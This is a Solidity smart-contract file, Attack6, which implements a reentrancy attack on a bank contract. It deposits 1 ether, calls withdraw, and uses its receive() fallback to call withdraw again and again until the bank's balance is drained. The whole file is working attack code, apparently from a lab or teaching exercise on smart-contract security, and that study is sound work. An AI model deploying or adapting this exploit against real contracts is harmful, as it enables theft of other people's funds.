// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.17;

interface IBank {
    function deposit() payable external;
    function withdraw() external;
    function getBalance() external returns(uint);
}

contract Attack6 {
    IBank public bank;

    constructor(address _bank){
        bank = IBank(_bank);
    }

    receive() external payable {
        if(bank.getBalance() >= 1 ether){
            bank.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ether to start attack");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }

}